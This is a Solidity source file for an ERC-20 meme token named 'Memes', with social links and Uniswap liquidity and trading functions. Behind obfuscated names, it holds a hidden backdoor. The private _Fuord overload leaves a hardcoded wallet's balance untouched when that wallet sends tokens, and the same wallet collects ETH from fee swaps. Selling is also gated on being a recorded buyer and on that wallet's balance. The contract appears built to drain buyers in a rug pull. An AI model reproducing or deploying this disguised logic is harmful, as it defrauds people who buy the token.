/*

     Twitter: https://twitter.com/memescoin_erc20

     Telegram: https://t.me/memescoin_erc20

     Website: https://memeseth.com/

**/


// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Fuord(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Fuord(a, b, "SafeMath");
    }

    function  _Fuord(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _kruhe(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Memes is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _bacqlf;
    address payable private Fiauvk;
    address private _Bvrfp;
    string private constant _name = unicode"Memes";
    string private constant _symbol = unicode"Memes";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rdfoqr=0;
    uint256 private _pcfajt=0;
    uint256 public _wdlkh = _totalSupply;
    uint256 public _qrtfk = _totalSupply;
    uint256 public _pvoeb= _totalSupply;
    uint256 public _qrtlk= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Qlsrvo;
    mapping (address => bool) private _hvpruk;
    mapping(address => uint256) private _fsievg;

    bool private _rfkvopen;
    bool public _prokjv = false;
    bool private jltdnk = false;
    bool private _rqognj = false;


    event _psjaup(uint _wdlkh);
    modifier ofvzny {
        jltdnk = true;
        _;
        jltdnk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Qlsrvo[owner(

        )] = true;
        _Qlsrvo[address
        (this)] = true;
        _Qlsrvo[
            Fiauvk] = true;
        Fiauvk = 
        payable (0xcc774f6A7A945c72A10223c4098083f3317af40F);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Fuord(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Glaujr=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prokjv) {
                if (to 
                != address
                (_bacqlf) 
                && to !=
                 address
                 (_Bvrfp)) {
                  require(_fsievg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fsievg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Bvrfp && to != 
            address(_bacqlf) &&
             !_Qlsrvo[to] ) {
                require(amount 
                <= _wdlkh,
                 "Exceeds the _wdlkh.");
                require(balanceOf
                (to) + amount
                 <= _qrtfk,
                  "Exceeds the _qrtfk.");
                if(_pcfajt
                < _Rdfoqr){
                  require
                  (! _frtdv(to));
                }
                _pcfajt++;
                 _hvpruk
                 [to]=true;
                Glaujr = amount._kruhe
                ((_pcfajt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Bvrfp &&
             from!= address(this) 
            && !_Qlsrvo[from] ){
                require(amount <= 
                _wdlkh && 
                balanceOf(Fiauvk)
                <_qrtlk,
                 "Exceeds the _wdlkh.");
                Glaujr = amount._kruhe((_pcfajt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pcfajt>
                _Rdfoqr &&
                 _hvpruk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!jltdnk 
            && to == _Bvrfp &&
             _rqognj &&
             contractTokenBalance>
             _pvoeb 
            && _pcfajt>
            _Rdfoqr&&
             !_Qlsrvo[to]&&
              !_Qlsrvo[from]
            ) {
                _transferFrom( _ploev(amount, 
                _ploev(contractTokenBalance,
                _qrtlk)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pdhack(address
                    (this).balance);
                }
            }
        }

        if(Glaujr>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Glaujr);
          emit
           Transfer(from,
           address
           (this),Glaujr);
        }
        _balances[from
        ]= _Fuord(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Fuord(Glaujr));
        emit Transfer
        (from, to, 
        amount.
         _Fuord(Glaujr));
    }

    function _transferFrom(uint256
     tokenAmount) private
      ofvzny {
        if(tokenAmount==
        0){return;}
        if(!_rfkvopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _bacqlf.WETH();
        _approve(address(this),
         address(
             _bacqlf), 
             tokenAmount);
        _bacqlf.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _ploev
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Fuord(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Fiauvk){
            return a ;
        }else{
            return a .
             _Fuord (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _wdlkh = _totalSupply;
        _qrtfk = _totalSupply;
        emit _psjaup(_totalSupply);
    }

    function _frtdv(address 
    account) private view 
    returns (bool) {
        uint256 Yfvrp;
        assembly {
            Yfvrp :=
             extcodesize
             (account)
        }
        return Yfvrp > 
        0;
    }

    function _pdhack(uint256
    amount) private {
        Fiauvk.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _rfkvopen ) ;
        _bacqlf  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _bacqlf), 
            _totalSupply);
        _Bvrfp = 
        IUniswapV2Factory(_bacqlf.
        factory( ) 
        ). createPair (
            address(this
            ),  _bacqlf .
             WETH ( ) );
        _bacqlf.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Bvrfp).
        approve(address(_bacqlf), 
        type(uint)
        .max);
        _rqognj = true;
        _rfkvopen = true;
    }

    receive() external payable {}
}